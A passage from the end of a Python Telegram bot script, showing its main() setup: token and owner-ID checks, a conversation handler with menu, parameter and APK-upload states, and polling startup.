            await update.message.reply_text(f"تعذّر الإلغاء: {r.text}")


def main():
    token = BOT_TOKEN
    if not token:
        print("Please set TELEGRAM_BOT_TOKEN in environment.")
        return
    if REQUIRE_OWNER_ID and OWNER_ID == 0:
        print("REQUIRE_OWNER_ID is enabled but TELEGRAM_OWNER_ID is not set. Exiting.")
        return
    application = Application.builder().token(token).build()
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start), CommandHandler("menu", start)],
        states={
            MENU: [CallbackQueryHandler(menu_handler)],
            PARAMS: [
                MessageHandler(filters.TEXT & (~filters.COMMAND), params_handler),
                CommandHandler("start", start),
                CommandHandler("menu", start),
                CallbackQueryHandler(menu_handler),
            ],
            UPLOAD_APK: [MessageHandler(filters.Document.ALL, handle_uploaded_file)],
            UPLOAD_PARAMS: [MessageHandler(filters.TEXT & (~filters.COMMAND), handle_upload_params)],
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("menu", start)],
        per_message=False,
        per_user=True,
        per_chat=True,
    )
    application.add_handler(conv)
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(MessageHandler(filters.COMMAND, unknown))
    logger.info("Starting polling...")
    try:
        application.run_polling(allowed_updates=("message","callback_query"), drop_pending_updates=True)
    except SystemExit:
        raise
    except Exception:
        logger.exception("Bot stopped due to an error")


if __name__ == "__main__":
    main()